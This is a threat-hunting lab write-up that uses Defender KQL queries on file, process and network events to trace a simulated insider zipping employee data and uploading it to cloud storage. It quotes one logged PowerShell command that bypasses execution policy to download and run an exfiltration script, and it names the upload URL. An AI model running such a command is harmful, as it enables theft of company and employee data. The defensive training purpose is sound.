# Threat Hunting - Suspected Data Exfiltration

For the sake of this lab, we assume the name of the device that John Doe primarily uses is **"zack-bruteforce."**

## 1. Preparation

**Goal:** Set up the hunt by defining what you're looking for.

An employee named John Doe, working in a sensitive department, recently got put on a performance improvement plan (PIP). After John threw a fit, management raised concerns that John may be planning to steal proprietary information and then quit the company. Your task is to investigate John's activities using Microsoft Defender for Endpoint (MDE) and ensure nothing suspicious is taking place.

**Activity:** Develop a hypothesis based on threat intelligence and security gaps (e.g., “Could there be lateral movement in the network?”).

John is an administrator on his device and is not limited on which applications he uses. He may try to archive/compress sensitive information and send it to a private drive, etc.

## 2. Data Collection

**Goal:** We will look at the following tables for indications of malicious actions:
- `DeviceFileEvents`
- `DeviceProcessEvents`
- `DeviceNetworkEvents`

___

This KQL query will check the log files for any recent file creation that includes the `.zip` extension.

```kql
let suspectDevice = "zack-bruteforce";
DeviceFileEvents
| where DeviceName == suspectDevice and FileName contains ".zip"
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, InitiatingProcessFolderPath, InitiatingProcessFileName
```
<img width="1444" alt="Screenshot 1 Filename and ProcessFilename" src="https://github.com/user-attachments/assets/5169faa9-6403-4210-949a-86e95e2cc397" />

We see on 2025-05-21T04:49:41 GMT a file named "employee-data-20250521044933.zip" was created using 7z.exe (not shown in screenshot). This was then moved to a folder called "backup" in the Program Data folder. The naming of this file and folder is suspicious and we should investigate further into the process that created this file.

This process was repeated on 5/26 which means we may be seeing a script running that is routinely zipping employee data and moving it to backup folder. 
___

Looking at the DeviceProcessEvents we will see what activity took place two minutes before and two minutes after 2025-05-21T04:49:41 GMT.

```kql
let suspectDevice = "zack-bruteforce";
let suspectedProcessTime = datetime(2025-05-21T04:49:41.1085818Z);
DeviceProcessEvents
| where DeviceName == suspectDevice and Timestamp between ((suspectedProcessTime - 2m) .. (suspectedProcessTime + 2m))
| order by Timestamp asc
| project Timestamp, ProcessCommandLine
```

<img width="1422" alt="Screenshot 2 Timeline of processes" src="https://github.com/user-attachments/assets/6d4ba2c9-0b96-42c0-a44c-618d1136503f" />


1. A command to initiate powershell and execute a script called script4.ps1. The cmd prompt terminated upon completion (the /C switch) and script execution policy was bypassed.
2. Powershell ran script4.ps1 unrestricted.
3. A new command shell was crated to execute a powershell command that would download a file from GitHub and save it to the Programdata folder. The file is called "exfiltratedata.ps1."
Full URL: powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
4. Powershell ran the command bypassing execution policy.
5. A command to run the downloaded file from powershell.
6. Powershell ran the command to run the downloaded file.
7. 7Zip, a common archiving tool, was installed silently (no notification or interaction from the user).
8. 7Zip executed a command to archive a file called employee-data-20250521044933.csv and safe it to the ProgramData folder as employee-data-20250521044933.zip.

___

The previous KQL query revealed where the malicious script is stored. Viewing the script shows that indeed it was archiving data and uploading it outside of the network to "https://sacyberrangedanger.blob.core.windows.net/stolencompanydata/employee-data.zip"

<img width="998" alt="Screenshot 3" src="https://github.com/user-attachments/assets/1d38c161-8a99-4ddb-aa8b-a8aad1724f85" /><br>
The location to upload the zipped employee data is defined in the variable $storageURL.<br>

<img width="968" alt="スクリーンショット 2025-05-29 11 57 48" src="https://github.com/user-attachments/assets/0bb7617d-704e-4511-bcb9-07a54ad091dd" /><br>
The location of the employee data is defined in the variable $zipfilepath.<br>

<img width="885" alt="スクリーンショット 2025-05-29 11 58 45" src="https://github.com/user-attachments/assets/46520a20-48b3-45fa-beee-06dfee6321ce" /><br>
The actual line in the powershell script that invokes a web request to put the file in $zipfilepath to $storageURL.
____

Checking DeviceNetworkEvents for activity within 2 minutes before and 2 minutes after the script execution we can check for network activity to that URL.

```kql
let suspectDevice = "zack-bruteforce";
let suspectedProcessTime = datetime(2025-05-21T04:49:41.1085818Z);
DeviceNetworkEvents
| where DeviceName == suspectDevice and Timestamp between ((suspectedProcessTime - 2m) .. (suspectedProcessTime + 2m))
```

<img width="1420" alt="Screenshot 4" src="https://github.com/user-attachments/assets/7d07a2c6-403f-4dee-9513-613adb57d0f6" />


The device successfully connected to the URL and according to the script uploaded the archived employee data.



___


